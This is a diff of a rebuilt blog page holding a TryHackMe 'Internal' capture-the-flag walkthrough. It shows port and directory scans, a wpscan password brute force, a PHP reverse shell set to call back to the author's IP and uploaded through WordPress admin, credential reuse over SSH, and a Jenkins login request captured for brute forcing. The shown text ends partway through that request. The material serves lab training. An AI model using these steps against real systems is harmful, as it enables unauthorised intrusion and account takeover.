@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -13,7 +13,7 @@
 
 
 
-<meta name="author" content="Animesh Roy"  />
+<meta name="author" content="Animesh Roy @anir0y  "  />
 <meta name="description" content="TryHackMe Room Internal solved by Animesh Roy. this is a walkthough. read more..." />
 
 
@@ -34,6 +34,16 @@
 
 
 
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
 <meta property="og:title" content="Animesh Roy | Blogs & Writeups">
@@ -41,9 +51,11 @@
 <meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
 
 
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
 
 <meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-internal/">
+<meta property="twitter:url" content="http://localhost:1313/post/tryhackme-internal/">
 
 <meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
 <meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
@@ -63,22 +75,27 @@
 
 
 
-<link rel="canonical" href="https://classroom.anir0y.in/post/tryhackme-internal/" />
+<link rel="canonical" href="http://localhost:1313/post/tryhackme-internal/" />
 
 
-<meta property="og:title" content="TryHackMe Internal" />
-<meta property="og:description" content="TryHackMe Room Internal solved by Animesh Roy. this is a walkthough. read more..." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-internal/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-08-10T11:44:25+05:30" />
-<meta property="article:modified_time" content="2021-08-10T11:44:25+05:30" />
+<meta property="og:url" content="http://localhost:1313/post/tryhackme-internal/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="TryHackMe Internal">
+  <meta property="og:description" content="TryHackMe Room Internal solved by Animesh Roy. this is a walkthough. read more...">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-08-10T11:44:25+05:30">
+    <meta property="article:modified_time" content="2021-08-10T11:44:25+05:30">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Internal">
 
 
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TryHackMe Internal"/>
-<meta name="twitter:description" content="TryHackMe Room Internal solved by Animesh Roy. this is a walkthough. read more..."/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Internal">
+  <meta name="twitter:description" content="TryHackMe Room Internal solved by Animesh Roy. this is a walkthough. read more...">
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -153,7 +170,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/classroom.anir0y.in'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
   </div>
   
   <div class="item">
@@ -201,10 +218,10 @@
         <i class="save icon"></i>
       </button>
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Internal&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-internal%2f" class="ui circular twitter icon button">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Internal&url=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-internal%2f" class="ui circular twitter icon button">
   <i class="twitter icon"></i>
 </a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-internal%2f" class="ui circular facebook icon button">
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-internal%2f" class="ui circular facebook icon button">
   <i class="facebook icon"></i>
 </a>
 
@@ -238,26 +255,26 @@
 
       <article class="main"><h2 id="overview">OverView</h2>
 <table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><script src="https://tryhackme.com/badge/434937"></script></td>
-<td><a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a></td>
-</tr>
-<tr>
-<td>internal</td>
-<td><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/8f245ccd549148ce6c6f76a583b842d6.jpeg" alt="logo"></td>
-</tr>
-<tr>
-<td><b> Room [Subscription Required] </b></td>
-<td><a href="">internal</a><a href="https://tryhackme.com/room/internal">https://tryhackme.com/room/internal</a></td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><script src="https://tryhackme.com/badge/434937"></script></td>
+          <td><a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a></td>
+      </tr>
+      <tr>
+          <td>internal</td>
+          <td><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/8f245ccd549148ce6c6f76a583b842d6.jpeg" alt="logo"></td>
+      </tr>
+      <tr>
+          <td><b> Room [Subscription Required] </b></td>
+          <td><a href="">internal</a><a href="https://tryhackme.com/room/internal">https://tryhackme.com/room/internal</a></td>
+      </tr>
+  </tbody>
 </table>
 <h2 id="task-01-pre-engagement-briefing">Task 01: Pre-engagement Briefing</h2>
 <p>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
@@ -293,24 +310,24 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>nmap</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-08-10 11:53 IST
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.109.3
-Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey: 
-|   <span style="color:#ae81ff">2048</span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">256</span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.13 seconds
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-08-10 11:53 IST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.109.3
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.13 seconds
+</span></span></code></pre></div></li>
 <li>
 <p>2 ports aare OPEN. I did ran <code>full port</code> scan to be sure and returns no results so, not mentioning them here.</p>
 </li>
@@ -323,24 +340,24 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 </li>
 <li>
 <p>Directory Buster, returns <code>/blog</code> directory.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.109.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o internaal-root.gobuster
-<span style="color:#f92672">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-<span style="color:#f92672">===============================================================</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.109.3
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
-<span style="color:#f92672">===============================================================</span>
-2021/08/10 12:00:47 Starting gobuster in directory enumeration mode
-<span style="color:#f92672">===============================================================</span>
-/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.109.3/blog/<span style="color:#f92672">]</span>
-/wordpress            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.109.3/wordpress/<span style="color:#f92672">]</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.109.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o internaal-root.gobuster
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.109.3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2021/08/10 12:00:47 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.109.3/blog/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wordpress            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.109.3/wordpress/<span style="color:#f92672">]</span>
+</span></span></code></pre></div></li>
 <li>
 <p>exploring <code>/blog</code> dir</p>
 </li>
@@ -356,53 +373,52 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <p><code>Wordpress</code> enumeration:</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://internal.thm/blog -e vp,u
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> URL: http://internal.thm/blog/ <span style="color:#f92672">[</span>10.10.109.3<span style="color:#f92672">]</span>
-
-Interesting Finding<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress version 5.4.2 identified <span style="color:#f92672">(</span>Insecure, released on 2020-06-10<span style="color:#f92672">)</span>.
- | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress theme in use: twentyseventeen
- | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
- | Last Updated: 2021-07-22T00:00:00.000Z
-
-<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin
- | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
- | Confirmed By:
- |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
- |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
- |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
- |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
-
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://internal.thm/blog -e vp,u
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> URL: http://internal.thm/blog/ <span style="color:#f92672">[</span>10.10.109.3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interesting Finding<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress version 5.4.2 identified <span style="color:#f92672">(</span>Insecure, released on 2020-06-10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress theme in use: twentyseventeen
+</span></span><span style="display:flex;"><span> | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
+</span></span><span style="display:flex;"><span> | Last Updated: 2021-07-22T00:00:00.000Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
 <li>found a Valid username, let&rsquo;s try bruteforcing with <code>wpscan</code>:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads <span style="color:#ae81ff">30</span>
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Performing password attack on Xmlrpc against <span style="color:#ae81ff">1</span> user/s
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Valid Combinations Found:
- | Username: admin, Password: <span style="color:#f92672">[</span>password-was-here<span style="color:#f92672">]</span>
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Performing password attack on Xmlrpc against <span style="color:#ae81ff">1</span> user/s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Valid Combinations Found:
+</span></span><span style="display:flex;"><span> | Username: admin, Password: <span style="color:#f92672">[</span>password-was-here<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
 <li>Creds worked just fine, now we&rsquo;re logged in as <code>admin</code> in wordpress! let&rsquo;s use a php shell to gain backdoor access.</li>
 </ul>
 <h2 id="user">user</h2>
 <ul>
 <li>
 <p>find and edit php shell:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Find shell: (in Kali linux )</span>
-cp /usr/share/laudanum/php/php-reverse-shell.php shell.php <span style="color:#75715e">#copy shell to current dir ~/thm/internal/www</span>
-
-<span style="color:#75715e"># edit the IP &amp; port</span>
-
-$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.17.4.40&#39;</span>;  // CHANGE THIS
-$port <span style="color:#f92672">=</span> 1337;       // CHANGE THIS
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Find shell: (in Kali linux )</span>
+</span></span><span style="display:flex;"><span>cp /usr/share/laudanum/php/php-reverse-shell.php shell.php <span style="color:#75715e">#copy shell to current dir ~/thm/internal/www</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># edit the IP &amp; port</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.17.4.40&#39;</span>;  // CHANGE THIS
+</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> 1337;       // CHANGE THIS
+</span></span></code></pre></div></li>
 <li>
 <p>upload shell:</p>
 <p><img src="https://i.imgur.com/OXq644A.png" alt="img"></p>
@@ -413,24 +429,24 @@ $port <span style="color:#f92672">=</span> 1337;       // CHANGE THIS
 </li>
 <li>
 <p>can&rsquo;t read <code>user.txt</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /home
-total <span style="color:#ae81ff">4</span>
-drwx------ <span style="color:#ae81ff">7</span> aubreanna aubreanna <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> aubreanna
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -l /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">7</span> aubreanna aubreanna <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> aubreanna
+</span></span></code></pre></div></li>
 <li>
 <p>enumeration # got hint for look into <code>/opt</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls /opt
-containerd
-wp-save.txt
-$ cat /opt/wp-save.txt
-Bill,
-Aubreanna needed these credentials <span style="color:#66d9ef">for</span> something later.  Let her know you have them and where they are.
-aubreanna:<span style="color:#f92672">[</span>password-was-here<span style="color:#f92672">]</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls /opt
+</span></span><span style="display:flex;"><span>containerd
+</span></span><span style="display:flex;"><span>wp-save.txt
+</span></span><span style="display:flex;"><span>$ cat /opt/wp-save.txt
+</span></span><span style="display:flex;"><span>Bill,
+</span></span><span style="display:flex;"><span>Aubreanna needed these credentials <span style="color:#66d9ef">for</span> something later.  Let her know you have them and where they are.
+</span></span><span style="display:flex;"><span>aubreanna:<span style="color:#f92672">[</span>password-was-here<span style="color:#f92672">]</span>
+</span></span></code></pre></div></li>
 <li>
 <p>SSH into box</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh aubreanna@10.10.109.3
-</code></pre></div><p><img src="https://i.imgur.com/QY6KMmb.png" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh aubreanna@10.10.109.3
+</span></span></code></pre></div><p><img src="https://i.imgur.com/QY6KMmb.png" alt="img"></p>
 </li>
 </ul>
 <hr>
@@ -455,37 +471,37 @@ aubreanna:<span style="color:#f92672">[</span>password-was-here<span style="colo
 </li>
 <li>
 <p>Bruteforcing <code>jenkins</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># POST DATA:</span>
-
-POST /j_acegi_security_check HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
-Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
-Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: <span style="color:#ae81ff">54</span>
-Origin: http://127.0.0.1:8080
-Connection: close
-Referer: http://127.0.0.1:8080/loginError
-Cookie: JSESSIONID.851f9285<span style="color:#f92672">=</span>node0c86ow5ll7bfx1kor9ova06bxn0.node0
-Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
-
-j_username<span style="color:#f92672">=</span>admin&amp;j_password<span style="color:#f92672">=</span>er&amp;from<span style="color:#f92672">=</span>%2F&amp;Submit<span style="color:#f92672">=</span>Sign+in 
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># POST DATA:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /j_acegi_security_check HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:8080
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>Origin: http://127.0.0.1:8080
+</span></span><span style="display:flex;"><span>Connection: close
